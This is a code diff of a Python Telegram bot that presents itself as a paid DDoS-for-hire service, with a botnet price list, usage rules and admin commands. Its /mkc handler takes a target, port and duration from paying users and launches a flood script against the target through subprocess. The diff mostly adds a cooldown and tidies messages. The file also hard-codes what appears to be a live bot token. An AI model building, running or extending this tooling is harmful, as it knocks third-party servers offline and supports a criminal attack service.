@@ -1,14 +1,13 @@
 #!/usr/bin/python3
-#By Team AX @TeamAX_03
+# By Team AX @TeamAX_03
 
 import telebot
 import subprocess
 import threading
-import requests
 import datetime
 import os
 
-# insert your Telegram bot token here
+# Insert your Telegram bot token here
 bot = telebot.TeleBot('7058319983:AAGNwslYvlwlllWlPf7LXsALtuyoBHuFmr8')
 
 # Admin user IDs
@@ -20,7 +19,6 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
-
 # Function to read user IDs from the file
 def read_users():
     try:
@@ -28,23 +26,6 @@ def read_users():
             return file.read().splitlines()
     except FileNotFoundError:
         return []
-
-# Function to read free user IDs and their credits from the file
-def read_free_users():
-    try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():  # Check if line is not empty
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
-    except FileNotFoundError:
-        pass
-
 
 # List to store allowed user IDs
 allowed_user_ids = read_users()
@@ -59,7 +40,6 @@ def log_command(user_id, target, port, time):
     
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
-
 
 # Function to clear logs
 def clear_logs():
@@ -98,17 +78,15 @@ def add_user(message):
                 allowed_user_ids.append(user_to_add)
                 with open(USER_FILE, "a") as file:
                     file.write(f"{user_to_add}\n")
-                response = f"User {user_to_add} Added Successfully."
+                response = f"User {user_to_add} added successfully."
             else:
                 response = "User already exists."
         else:
             response = "Please specify a user ID to add."
     else:
-        response = "Only Admin Can Run This Command."
-
+        response = "Only Admin can run this command."
+    
     bot.reply_to(message, response)
-
-
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -126,13 +104,12 @@ def remove_user(message):
             else:
                 response = f"User {user_to_remove} not found in the list."
         else:
-            response = '''Please Specify A User ID to Remove. 
+            response = '''Please specify a user ID to remove.
  Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command."
-
+        response = "Only Admin can run this command."
+    
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_command(message):
@@ -145,14 +122,12 @@ def clear_logs_command(message):
                     response = "Logs are already cleared. No data found."
                 else:
                     file.truncate(0)
-                    response = "Logs Cleared Successfully"
+                    response = "Logs cleared successfully"
         except FileNotFoundError:
             response = "Logs are already cleared."
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only Admin can run this command."
     bot.reply_to(message, response)
-
- 
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
@@ -175,9 +150,8 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found"
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only Admin can run this command."
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['logs'])
 def show_recent_logs(message):
@@ -194,17 +168,14 @@ def show_recent_logs(message):
             response = "No data found"
             bot.reply_to(message, response)
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only Admin can run this command."
         bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
     user_id = str(message.chat.id)
     response = f"Your ID: {user_id}"
     bot.reply_to(message, response)
-
-
 
 # Function to handle the reply when free users run the /mkc command
 def start_attack_reply(message, target, port, time):
@@ -217,7 +188,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /mkc command
 mkc_cooldown = {}
 
-COOLDOWN_TIME = 0
+COOLDOWN_TIME = 300  # Set cooldown time to 5 minutes (300 seconds)
 
 # Handler for /mkc command
 @bot.message_handler(commands=['mkc'])
@@ -227,20 +198,22 @@ def handle_mkc(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in mkc_cooldown and (datetime.datetime.now() - mkc_cooldown[user_id]).seconds < 1:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /mkc Command Again."
+            if user_id in mkc_cooldown and (datetime.datetime.now() - mkc_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = "You Are On Cooldown. Please Wait 5 Minutes Before Running The /mkc Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
             mkc_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 4:  # Updated to accept target, port, and time
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
             if time > 5000:
-                response = "Error: Time interval must be less than 80."
+                response = "Error: Time interval must be less than 5000."
+                bot.reply_to(message, response)
+                return
             else:
                 record_command_logs(user_id, '/mkc', target, port, time)
                 log_command(user_id, target, port, time)
@@ -256,19 +229,22 @@ def handle_mkc(message):
                     "--threads", "6",
                     "--duration", str(time)  # Pass the duration to the script
                 ]
-                subprocess.Popen(attack_command)
                 
+                # Start the attack process
+                attack_process = subprocess.Popen(attack_command)
+
+                # Wait for the attack to finish
+                attack_process.wait()
+                
+                # Send the completion message
                 response = f"mkc Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /mkc <target> <port> <time>\nBy TeamAX @TeamAX_03"  # Updated command syntax
+            response = "Usage: /mkc <target> <port> <time>\nBy TeamAX @TeamAX_03"  # Updated command syntax
     else:
         response = "You Are Not Authorized To Use This Command.\nBy Team AX @TeamAX_03"
-
+    
     bot.reply_to(message, response)
 
-
-
-# Add /mylogs command to display logs recorded for mkc and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -285,83 +261,72 @@ def show_command_logs(message):
             response = "No command logs found."
     else:
         response = "You Are Not Authorized To Use This Command."
-
+    
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''Available commands:
- /mkc : Method For mkc Servers. 
- /rules : Please Check Before Use !!.
- /mylogs : To Check Your Recents Attacks.
- /plan : Checkout Our Botnet Rates.
+/mkc : Method for mkc servers.
+/rules : Please check before use.
+/mylogs : To check your recent attacks.
+/plan : Checkout our botnet rates.
 
- To See Admin Commands:
- /admincmd : Shows All Admin Commands.
- By Team AX @TeamAX_03
+To see admin commands:
+/admincmd : Shows all admin commands.
+By Team AX @TeamAX_03
 '''
-    for handler in bot.message_handlers:
-        if hasattr(handler, 'commands'):
-            if message.text.startswith('/help'):
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-            elif handler.doc and 'admin' in handler.doc.lower():
-                continue
-            else:
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
     bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy Team AX @TeamAX_03"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry to run this command: /help\nWelcome to the World's Best Ddos Bot\nBy Team AX @TeamAX_03"
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
     response = f'''{user_name} Please Follow These Rules:
 
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
+1. Don't run too many attacks to avoid a ban from the bot.
+2. Don't run 2 attacks at the same time to avoid a ban from the bot.
+3. We daily check the logs, so follow these rules to avoid a ban.
 By Team AX @TeamAX_03'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+    response = f'''{user_name}, Brother, only 1 plan is powerful than any other DDoS:
 
-Vip :
--> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
--> Concurrents Attack : 300
+Vip:
+-> Attack Time: 200 (S)
+-> After Attack Limit: 2 Min
+-> Concurrent Attacks: 300
 
-Pr-ice List:
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
+Price List:
+Day --> 150 Rs
+Week --> 900 Rs
+Month --> 1600 Rs
 By Team AX @TeamAX_03
 '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
-def welcome_plan(message):
+def show_admin_commands(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
+    response = f'''{user_name}, Admin Commands Are Here:
 
-/add <userId> : Add a User.
-/remove <userid> Remove a User.
-/allusers : Authorised Users Lists.
-/logs : All Users Logs.
-/broadcast : Broadcast a Message.
-/clearlogs : Clear The Logs File.
+/add <userId> : Add a user.
+/remove <userid> : Remove a user.
+/allusers : Authorized users list.
+/logs : All users logs.
+/broadcast : Broadcast a message.
+/clearlogs : Clear the logs file.
 By Team AX @TeamAX_03
 '''
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
@@ -377,16 +342,13 @@ def broadcast_message(message):
                         bot.send_message(user_id, message_to_broadcast)
                     except Exception as e:
                         print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast Message Sent Successfully To All Users."
+            response = "Broadcast message sent successfully to all users."
         else:
-            response = "Please Provide A Message To Broadcast."
+            response = "Please provide a message to broadcast."
     else:
-        response = "Only Admin Can Run This Command."
-
+        response = "Only Admin can run this command."
+    
     bot.reply_to(message, response)
 
-
-
-
 bot.polling()
-#By Team AX @TeamAX_03
+# By Team AX @TeamAX_03
